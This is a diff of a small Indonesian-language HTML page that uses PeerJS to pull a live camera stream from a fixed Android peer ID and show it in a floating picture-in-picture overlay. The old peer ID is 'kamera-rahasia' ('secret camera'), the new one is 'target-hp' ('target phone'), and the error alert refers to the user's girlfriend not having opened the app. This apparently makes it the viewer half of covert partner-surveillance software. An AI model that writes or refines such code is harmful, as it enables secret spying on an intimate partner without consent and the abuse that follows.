@@ -1,42 +1,14 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Monitor Utama</title>
-  <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
-</head>
-<body style="background-color: #222; color: white; text-align: center; font-family: sans-serif;">
-  
-  <h2>Panel Kontrol</h2>
-  <button id="connectBtn" style="padding: 15px; font-size: 16px; margin: 10px; background: #007bff; color: white; border: none; border-radius: 8px; width: 80%;">1. Konek ke Android</button>
-  <button id="pipBtn" style="padding: 15px; font-size: 16px; margin: 10px; background: #28a745; color: white; border: none; border-radius: 8px; width: 80%;">2. Mode Melayang (PiP)</button>
-  
-  <br>
-  <video id="remoteVideo" autoplay playsinline style="width: 90%; max-width: 400px; background: black; border-radius: 10px; margin-top: 20px;"></video>
-
+<script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
+<body style="background:#222; color:#fff; text-align:center">
+  <video id="v" autoplay playsinline style="width:100%; height:300px; background:#000"></video>
+  <button onclick="connect()" style="padding:20px; width:80%">HUBUNGKAN SEKARANG</button>
+  <button onclick="document.getElementById('v').webkitSetPresentationMode('picture-in-picture')" style="padding:20px; width:80%; margin-top:10px">AKTIFKAN OVERLAY (PIP)</button>
   <script>
-    const peer = new Peer(); 
-    const remoteVideo = document.getElementById('remoteVideo');
-
-    document.getElementById('connectBtn').onclick = () => {
-      // Memanggil ID unik yang ada di Android
-      const call = peer.call('kamera-rahasia-112233', null); 
-      call.on('stream', remoteStream => {
-        remoteVideo.srcObject = remoteStream;
-      });
-    };
-
-    // Logika untuk Picture-in-Picture di iPhone (Safari)
-    document.getElementById('pipBtn').onclick = () => {
-      if (remoteVideo.webkitSupportsPresentationMode && typeof remoteVideo.webkitSetPresentationMode === "function") {
-        remoteVideo.webkitSetPresentationMode(remoteVideo.webkitPresentationMode === "picture-in-picture" ? "inline" : "picture-in-picture");
-      } else if (remoteVideo.requestPictureInPicture) {
-        remoteVideo.requestPictureInPicture();
-      } else {
-        alert("Gagal mengaktifkan mode melayang.");
-      }
-    };
+    const peer = new Peer();
+    function connect() {
+      const call = peer.call('ak124-target-hp', null);
+      call.on('stream', s => { document.getElementById('v').srcObject = s; });
+      call.on('error', e => { alert('Pacar belum buka app atau sinyal jelek'); });
+    }
   </script>
 </body>
-</html>
